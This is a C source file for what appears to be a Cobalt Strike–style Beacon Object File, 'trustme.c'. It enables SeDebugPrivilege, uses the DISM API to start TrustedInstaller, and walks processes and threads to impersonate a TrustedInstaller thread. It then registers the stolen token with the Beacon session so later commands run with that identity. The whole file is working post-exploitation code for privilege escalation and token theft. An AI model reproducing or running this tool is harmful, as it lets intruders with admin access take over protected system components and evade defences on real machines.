/*
 * trustme.c - Become TrustedInstaller BOF
 *
 * Uses the DISM API to trigger TrustedInstaller.exe, then walks
 * the process list via NtGetNextProcess/NtGetNextThread to find it
 * and impersonate one of its threads via NtImpersonateThread.
 *
 * Requires: Admin context with SeDebugPrivilege available
 *
 * Compile (x64):
 *   x86_64-w64-mingw32-gcc -c trustme.c -o trustme.x64.o -masm=intel
 *
 * Compile (x86):
 *   i686-w64-mingw32-gcc -c trustme.c -o trustme.x86.o -masm=intel
 */

#include <windows.h>
#include <winternl.h>
#include "beacon.h"

/* ======================================================================
 * Dynamic Function Resolution (DFR) declarations
 * ====================================================================== */

/* --- kernel32.dll --- */
DECLSPEC_IMPORT WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);
DECLSPEC_IMPORT WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
DECLSPEC_IMPORT WINBASEAPI BOOL    WINAPI KERNEL32$FreeLibrary(HMODULE);
DECLSPEC_IMPORT WINBASEAPI HANDLE  WINAPI KERNEL32$GetCurrentThread(void);
DECLSPEC_IMPORT WINBASEAPI BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT WINBASEAPI DWORD   WINAPI KERNEL32$GetLastError(void);

/* --- advapi32.dll --- */
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI ADVAPI32$LookupPrivilegeValueA(LPCSTR, LPCSTR, PLUID);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI ADVAPI32$OpenThreadToken(HANDLE, DWORD, BOOL, PHANDLE);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI ADVAPI32$GetUserNameA(LPSTR, LPDWORD);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI ADVAPI32$GetTokenInformation(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI ADVAPI32$LookupAccountSidA(LPCSTR, PSID, LPSTR, LPDWORD, LPSTR, LPDWORD, PSID_NAME_USE);

/* --- msvcrt --- */
DECLSPEC_IMPORT void * __cdecl  MSVCRT$malloc(size_t);
DECLSPEC_IMPORT void   __cdecl  MSVCRT$free(void *);
DECLSPEC_IMPORT int    __cdecl  MSVCRT$_stricmp(const char *, const char *);
DECLSPEC_IMPORT wchar_t * __cdecl MSVCRT$wcsstr(const wchar_t *, const wchar_t *);
DECLSPEC_IMPORT wchar_t * __cdecl MSVCRT$_wcslwr(wchar_t *);
DECLSPEC_IMPORT void * __cdecl  MSVCRT$memcpy(void *, const void *, size_t);
DECLSPEC_IMPORT void * __cdecl  MSVCRT$memset(void *, int, size_t);

// Ntdll function typedefs
typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(
    HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* fnNtGetNextProcess)(
    HANDLE, ACCESS_MASK, ULONG, ULONG, PHANDLE);
typedef NTSTATUS(NTAPI* fnNtGetNextThread)(
    HANDLE, HANDLE, ACCESS_MASK, ULONG, ULONG, PHANDLE);
typedef NTSTATUS(NTAPI* fnNtImpersonateThread)(
    HANDLE, HANDLE, PSECURITY_QUALITY_OF_SERVICE);
typedef NTSTATUS(NTAPI* fnNtClose)(HANDLE);

// DISM function typedefs
typedef UINT DismSession;
typedef enum {
    DismImageHealthy       = 0,
    DismImageRepairable    = 1,
    DismImageNonRepairable = 2
} DismImageHealthState;

typedef HRESULT(WINAPI* fnDismInitialize)(UINT, PCWSTR, PCWSTR);
typedef HRESULT(WINAPI* fnDismOpenSession)(PCWSTR, PCWSTR, PCWSTR, DismSession*);
typedef HRESULT(WINAPI* fnDismCheckImageHealth)(DismSession, BOOL, PVOID, PVOID, PVOID, DismImageHealthState*);
typedef HRESULT(WINAPI* fnDismCloseSession)(DismSession);
typedef HRESULT(WINAPI* fnDismShutdown)(void);

// constants
#define DISM_ONLINE_IMAGE L"DISM_{53BFAE52-B167-4E2F-A258-0A37B57FF845}"

#ifndef ProcessImageFileName
#define ProcessImageFileName 27
#endif

#ifndef STATUS_INFO_LENGTH_MISMATCH
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#endif

#ifndef STATUS_BUFFER_TOO_SMALL
#define STATUS_BUFFER_TOO_SMALL ((NTSTATUS)0xC0000023L)
#endif

#ifndef SE_DEBUG_NAME
#define SE_DEBUG_NAME "SeDebugPrivilege"
#endif

// enable SeDebugPrivilege
static BOOL EnableDebugPrivilege(void) {
    HANDLE hToken = NULL;
    if (!ADVAPI32$OpenProcessToken((HANDLE)-1, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        BeaconPrintf(CALLBACK_ERROR, "OpenProcessToken failed: %lu", KERNEL32$GetLastError());
        return FALSE;
    }

    LUID luid;
    if (!ADVAPI32$LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &luid)) {
        BeaconPrintf(CALLBACK_ERROR, "LookupPrivilegeValue failed: %lu", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hToken);
        return FALSE;
    }

    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "AdjustTokenPrivileges failed: %lu", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hToken);
        return FALSE;
    }

    if (KERNEL32$GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        BeaconPrintf(CALLBACK_ERROR, "SeDebugPrivilege not available. Are you elevated?");
        KERNEL32$CloseHandle(hToken);
        return FALSE;
    }

    KERNEL32$CloseHandle(hToken);
    return TRUE;
}

// entrypoint
void go(char * args, int alen) {

    if (!EnableDebugPrivilege()) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to enable SeDebugPrivilege. Aborting.");
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] SeDebugPrivilege enabled");

    // load dismapi.dll and resolve DISM functions
    HMODULE hDism = KERNEL32$LoadLibraryA("dismapi.dll");
    if (!hDism) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to load dismapi.dll: %lu", KERNEL32$GetLastError());
        return;
    }

    fnDismInitialize       pDismInitialize       = (fnDismInitialize)KERNEL32$GetProcAddress(hDism, "DismInitialize");
    fnDismOpenSession      pDismOpenSession       = (fnDismOpenSession)KERNEL32$GetProcAddress(hDism, "DismOpenSession");
    fnDismCheckImageHealth pDismCheckImageHealth  = (fnDismCheckImageHealth)KERNEL32$GetProcAddress(hDism, "DismCheckImageHealth");
    fnDismCloseSession     pDismCloseSession      = (fnDismCloseSession)KERNEL32$GetProcAddress(hDism, "DismCloseSession");
    fnDismShutdown         pDismShutdown          = (fnDismShutdown)KERNEL32$GetProcAddress(hDism, "DismShutdown");

    if (!pDismInitialize || !pDismOpenSession || !pDismCheckImageHealth || !pDismCloseSession || !pDismShutdown) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to resolve one or more DISM functions");
        KERNEL32$FreeLibrary(hDism);
        return;
    }

    // resolve ntdll functions
    HMODULE hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to get ntdll handle");
        KERNEL32$FreeLibrary(hDism);
        return;
    }

    fnNtQueryInformationProcess pNtQIP  = (fnNtQueryInformationProcess)KERNEL32$GetProcAddress(hNtdll, "NtQueryInformationProcess");
    fnNtGetNextProcess          pNtGNP  = (fnNtGetNextProcess)KERNEL32$GetProcAddress(hNtdll, "NtGetNextProcess");
    fnNtGetNextThread           pNtGNT  = (fnNtGetNextThread)KERNEL32$GetProcAddress(hNtdll, "NtGetNextThread");
    fnNtImpersonateThread       pNtIT   = (fnNtImpersonateThread)KERNEL32$GetProcAddress(hNtdll, "NtImpersonateThread");
    fnNtClose                   pNtC    = (fnNtClose)KERNEL32$GetProcAddress(hNtdll, "NtClose");

    if (!pNtQIP || !pNtGNP || !pNtGNT || !pNtIT || !pNtC) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to resolve one or more ntdll functions");
        KERNEL32$FreeLibrary(hDism);
        return;
    }

    // trigger TrustedInstaller via DISM
    HRESULT hr = pDismInitialize(0, NULL, NULL);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "DismInitialize failed: 0x%08X", hr);
        KERNEL32$FreeLibrary(hDism);
        return;
    }

    DismSession session = 0;
    hr = pDismOpenSession(DISM_ONLINE_IMAGE, NULL, NULL, &session);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "DismOpenSession failed: 0x%08X", hr);
        pDismShutdown();
        KERNEL32$FreeLibrary(hDism);
        return;
    }

    DismImageHealthState state;
    MSVCRT$memset(&state, 0, sizeof(state));
    hr = pDismCheckImageHealth(session, FALSE, NULL, NULL, NULL, &state);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "DismCheckImageHealth failed: 0x%08X", hr);
        pDismCloseSession(session);
        pDismShutdown();
        KERNEL32$FreeLibrary(hDism);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] DISM health check complete, TrustedInstaller should be running");

    // walk processes to find TrustedInstaller.exe
    HANDLE hProcess = NULL;
    HANDLE hPrevProcess = NULL;
    NTSTATUS status = 0;
    BOOL found = FALSE;

    while (NT_SUCCESS(pNtGNP(hProcess, PROCESS_QUERY_INFORMATION, 0, 0, &hProcess))) {
        if (hPrevProcess) pNtC(hPrevProcess);
        hPrevProcess = hProcess;

        ULONG len = 0;
        status = pNtQIP(hProcess, ProcessImageFileName, NULL, 0, &len);
        if (status != STATUS_INFO_LENGTH_MISMATCH && status != STATUS_BUFFER_TOO_SMALL)
            continue;
        if (len == 0)
            continue;

        PUNICODE_STRING pImageFileName = (PUNICODE_STRING)MSVCRT$malloc(len);
        if (!pImageFileName)
            continue;

        status = pNtQIP(hProcess, ProcessImageFileName, pImageFileName, len, &len);
        if (!NT_SUCCESS(status)) {
            MSVCRT$free(pImageFileName);
            continue;
        }

        BOOL isTarget = FALSE;
        if (pImageFileName->Buffer && pImageFileName->Length > 0) {
            // copy to stack buffer for case-insensitive match
            WCHAR lower[MAX_PATH];
            MSVCRT$memset(lower, 0, sizeof(lower));
            USHORT charsToCopy = pImageFileName->Length / sizeof(WCHAR);
            if (charsToCopy >= MAX_PATH) charsToCopy = MAX_PATH - 1;
            MSVCRT$memcpy(lower, pImageFileName->Buffer, charsToCopy * sizeof(WCHAR));
            lower[charsToCopy] = L'\0';
            MSVCRT$_wcslwr(lower);
            isTarget = (MSVCRT$wcsstr(lower, L"trustedinstaller.exe") != NULL);
        }
        MSVCRT$free(pImageFileName);

        if (!isTarget)
            continue;

        // get PID
        PROCESS_BASIC_INFORMATION pbi;
        MSVCRT$memset(&pbi, 0, sizeof(pbi));
        pNtQIP(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &len);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Found TrustedInstaller.exe (PID: %llu)",
                     (unsigned long long)pbi.UniqueProcessId);

        // walk threads and impersonate
        SECURITY_QUALITY_OF_SERVICE qos;
        MSVCRT$memset(&qos, 0, sizeof(qos));
        qos.Length = sizeof(qos);
        qos.ImpersonationLevel = SecurityImpersonation;
        qos.ContextTrackingMode = SECURITY_DYNAMIC_TRACKING;
        qos.EffectiveOnly = FALSE;

        HANDLE hThread = NULL;
        HANDLE hPrevThread = NULL;

        while (NT_SUCCESS(pNtGNT(hProcess, hThread, THREAD_DIRECT_IMPERSONATION, 0, 0, &hThread))) {
            if (hPrevThread) pNtC(hPrevThread);
            hPrevThread = hThread;

            status = pNtIT(KERNEL32$GetCurrentThread(), hThread, &qos);
            if (!NT_SUCCESS(status)) {
                BeaconPrintf(CALLBACK_ERROR, "NtImpersonateThread failed: 0x%08X", status);
                continue;
            }

            // make sure it actually worked by checking thread token identity
            char username[257];
            MSVCRT$memset(username, 0, sizeof(username));
            DWORD usernameLen = 257;
            ADVAPI32$GetUserNameA(username, &usernameLen);

            if (MSVCRT$_stricmp(username, "SYSTEM") == 0) {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] Thread impersonation successful (identity: %s)", username);

                
                // Register the impersonation token with Beacon so subsequent
                // beacon commands (ls, shell, etc.) use the TrustedInstaller context.
                // Open the thread token and pass it to BeaconUseToken.
                HANDLE hThreadToken = NULL;
                if (ADVAPI32$OpenThreadToken(KERNEL32$GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hThreadToken)) {
                    if (!BeaconUseToken(hThreadToken)) {
                        BeaconPrintf(CALLBACK_OUTPUT, "[!] BeaconUseToken failed, but thread impersonation is still active");
                    } else {
                        BeaconPrintf(CALLBACK_OUTPUT, "[+] Token applied to Beacon session");
                    }
					
                    // BeaconUseToken duplicates internally, but we don't close here just in case the implementation varies
					
                } else {
                    BeaconPrintf(CALLBACK_OUTPUT, "[!] Could not open thread token for BeaconUseToken (err: %lu), impersonation still active on this thread", KERNEL32$GetLastError());
                }

                found = TRUE;
                pNtC(hThread);
                pNtC(hProcess);
                goto cleanup_dism;
            }

            BeaconPrintf(CALLBACK_OUTPUT, "[!] Impersonation returned unexpected identity: %s", username);
        }

        if (hPrevThread) pNtC(hPrevThread);
        pNtC(hProcess);

        BeaconPrintf(CALLBACK_ERROR, "Found TrustedInstaller but could not impersonate any thread");
        goto cleanup_dism;
    }

    if (hPrevProcess && !found) pNtC(hPrevProcess);

    if (!found) {
        BeaconPrintf(CALLBACK_ERROR, "TrustedInstaller.exe not found in process walk");
    }

// clean up
cleanup_dism:
    pDismCloseSession(session);
    pDismShutdown();
    KERNEL32$FreeLibrary(hDism);

    if (found) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Now running as TrustedInstaller. Use 'rev2self' to revert.");
    }
}
